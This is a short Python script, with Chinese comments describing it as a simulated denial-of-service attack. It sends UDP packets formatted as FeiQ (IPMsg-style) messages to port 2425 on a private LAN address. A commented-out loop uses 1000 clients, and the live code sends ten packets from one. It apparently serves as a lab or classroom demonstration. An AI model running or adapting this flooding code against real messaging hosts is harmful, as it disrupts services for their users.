import socket,time

#模拟高频发送数据包的DOS攻击，循环内是模拟飞秋数据包的格式，然后建立连接，发送数据包，循环1000次，即是DOS攻击
#一个客户端发一条，1000个客户端都只发送一条
# for i in range(1000):
#     s = socket.socket(type=socket.SOCK_DGRAM) #以udp协议进行通信
#
#     s.connect(('192.168.72.128',2425))
#
#     pakectId = str(time.time())
#     name = "sss"
#     host = "sshost"
#     command = str(0x00000020)
#     content = "this message come from python===="
#     message = "1.0:"+pakectId+":"+name+":"+host+":"+command+":"+content
#
#     s.send(message.encode())


#一个客户端发送多条，不容易崩，一个客户端发10条
s = socket.socket(type=socket.SOCK_DGRAM) #以udp协议进行通信

s.connect(('192.168.72.128',2425))

pakectId = str(time.time())
name = "sss"
host = "sshost"
command = str(0x00000020)
content = "this message come from python===="
message = "1.0:"+pakectId+":"+name+":"+host+":"+command+":"+content
for i in range(10):
    s.send(message.encode())
